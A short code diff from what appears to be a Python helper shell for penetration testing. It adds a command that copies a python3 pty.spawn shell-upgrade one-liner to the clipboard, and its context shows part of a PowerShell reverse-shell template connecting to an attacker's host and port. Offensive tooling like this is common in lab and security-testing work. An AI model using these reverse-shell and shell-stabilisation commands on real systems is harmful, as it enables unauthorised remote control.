@@ -1168,6 +1168,12 @@ $client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream =
         print("[*] ip from tun0 copied to clipboard :)")
         return
 
+    def do_py3ttyup(self,line):
+        """copy to clipboard tipical python3 -c 'import pty; pty.spawn ... bla bla blah... """
+        os.system("echo \"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\"| xclip -sel clip")
+        print("[+] Try... echo \"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\"| xclip -sel clip # copied to clipboard :) ")
+        return
+
     def do_www(slf, line):
         """Start a web server with python3"""
         os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
